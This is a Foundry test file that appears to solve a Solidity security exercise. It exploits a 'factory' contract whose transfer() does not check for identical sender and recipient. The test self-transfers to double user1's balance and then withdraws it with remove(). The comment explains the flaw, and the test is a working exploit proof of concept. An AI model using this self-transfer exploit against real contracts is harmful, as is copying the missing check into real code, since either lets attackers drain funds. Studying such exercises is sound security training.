// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/factory.sol";

contract testfactory is Test, factory {
    factory _factory;
    address user1 = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    address user2 = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;

    function setUp() public {
        vm.prank(owner);
        _factory = new factory();

        vm.deal(user1, 100);
        vm.deal(user2, 100);

        vm.prank(user1);
        _factory.supply(user1, 100);
        vm.prank(user2);
        _factory.supply(user2, 100);
    }

    function testFactory() public {
        vm.prank(user1);

        //solution
        /**
         * The Vulnerability is, the "to" and "from" addresses are not compared each other
         * If the transfer() function called with the same to and from addresses, it will be succeeded.
         * And the balance get updated.
         *
         * By this way we can double the balance and remove it
         */

        // Double the balance
        _factory.transfer(user1, user1, 100);
        uint256 newbalance = _factory.checkbalance(user1);
        assertEq(newbalance, 200);

        // Remove the balamce
        vm.prank(user1);
        _factory.remove(user1, newbalance);
        newbalance = _factory.checkbalance(user1);
        assertEq(newbalance, 0);
    }
}
